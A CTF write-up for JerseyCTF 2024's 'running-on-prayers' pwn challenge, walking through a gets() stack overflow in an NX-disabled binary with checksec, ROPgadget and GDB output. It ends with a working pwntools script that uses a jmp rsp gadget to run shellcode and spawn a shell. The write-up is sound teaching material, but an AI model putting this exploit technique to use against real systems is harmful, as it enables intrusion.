+++
title = 'JerseyCTF 2024 - pwn/running-on-prayers'
date = 2024-03-24T18:51:51-04:00
draft = false
+++

We are given an executable and a netcat port. The name of the challenge suggests that this is a ROP challenge. Looking at the binary, all protections are off and the stack is executable, so we can inject shellcode.

```sh
checksec --file RunningOnPrayers
[*] '/home/df00/Desktop/RunningOnPrayers'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

The binary itself is very minimal, There is a main function that calls a vuln function. We use gets to read into a buffer, and that gives us our buffer overflow.

```c
undefined8 vuln(void)
{
  char local_28 [32];
  
  printf("The hard part is not finding the vulnerability, but actually doing something with it");
  gets(local_28);
  return 0;
}
```

I used ROPGadget to search for gadgets that we can use. Unfortunetly, no 'pop rdi' as that would have made things very easy. Given that we probably need to execute shellcode in this challenge, call and jmp would be useful gadets.

```sh
ROPgadget --binary RunningOnPrayers | grep "call"
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401012 : je 0x401016 ; call rax
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

```

```sh
ROPgadget --binary RunningOnPrayers | grep "jmp"
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x0000000000401173 : cli ; jmp 0x401100
0x0000000000401170 : endbr64 ; jmp 0x401100
0x00000000004010e5 : je 0x4010f0 ; mov edi, 0x404040 ; jmp rax
0x0000000000401127 : je 0x401130 ; mov edi, 0x404040 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401174 : jmp 0x401100
0x000000000040100b : jmp 0x4840103f
0x00000000004010ec : jmp rax
0x0000000000401231 : jmp rsp
0x00000000004010e7 : mov edi, 0x404040 ; jmp rax
0x000000000040116c : nop dword ptr [rax] ; endbr64 ; jmp 0x401100
0x00000000004010e6 : or dword ptr [rdi + 0x404040], edi ; jmp rax
0x00000000004010e3 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404040 ; jmp rax
0x0000000000401125 : test eax, eax ; je 0x401130 ; mov edi, 0x404040 ; jmp rax

```

Given that we have both jmp rax and call rax, my first thought was that we could use that. Lets overflow the buffer and take a look with GDB to see what happens.

```sh
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffdfe0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x0               
$rcx   : 0x007ffff7e1aaa0  →  0x00000000fbad208b
$rdx   : 0x1               
$rsp   : 0x007fffffffdfe0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x007fffffffe000  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$rsi   : 0x1               
$rdi   : 0x007ffff7e1ca80  →  0x0000000000000000
$rip   : 0x000000004011a7  →  <vuln+49> mov eax, 0x0
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x007ffff7c09c78  →  0x000f0022000043b3
$r11   : 0x246             
$r12   : 0x007fffffffe128  →  0x007fffffffe448  →  "/home/df00/Desktop/RunningOnPrayers"
$r13   : 0x000000004011ae  →  <main+0> endbr64 
$r14   : 0x00000000403e18  →  0x00000000401140  →  <__do_global_dtors_aux+0> endbr64 
$r15   : 0x007ffff7ffd040  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 

```

Here I just overflowed the buffer with all A's, but we see that our input is in rax. So if we fill our buffer with shellcode and call rax, it should execute right? Unfortunetly it won't. At vuln+49 right before we return, eax (lower 32 bits of rax) is set to zero.

```sh
gef➤  disas vuln
Dump of assembler code for function vuln:
   0x0000000000401176 <+0>:	endbr64 
   0x000000000040117a <+4>:	push   rbp
   0x000000000040117b <+5>:	mov    rbp,rsp
   0x000000000040117e <+8>:	sub    rsp,0x20
   0x0000000000401182 <+12>:	lea    rax,[rip+0xe7f]        # 0x402008
   0x0000000000401189 <+19>:	mov    rdi,rax
   0x000000000040118c <+22>:	mov    eax,0x0
   0x0000000000401191 <+27>:	call   0x401060 <printf@plt>
   0x0000000000401196 <+32>:	lea    rax,[rbp-0x20]
   0x000000000040119a <+36>:	mov    rdi,rax
   0x000000000040119d <+39>:	mov    eax,0x0
   0x00000000004011a2 <+44>:	call   0x401070 <gets@plt>
=> 0x00000000004011a7 <+49>:	mov    eax,0x0
   0x00000000004011ac <+54>:	leave  
   0x00000000004011ad <+55>:	ret    
End of assembler dump.
```
The other gadget that we can use is jmp rsp, and looking above we see that out input is also in rsp.

```sh
0x0000000000401231 : jmp rsp
```

rsp will point at the thing after the return pointer once ret has occured, so our shellcode will go right after jmp rsp.

The final solve script. Unfortunetly, the netcat port was down for almost the whole CTF, but as they say - it worked on my machine :) 

```python
from pwn import *

elf = ELF("./RunningOnPrayers")

context.binary = elf
context.log_level = "DEBUG"

libc = elf.libc
target = process("./RunningOnPrayers")


target.recvuntil("it")

jmp_rsp = next(elf.search(asm('jmp rsp')))
payload = flat(
    'A' * 0x28,             
    jmp_rsp,                
    asm(shellcraft.sh())     
)

target.sendline(payload)
target.interactive()
```


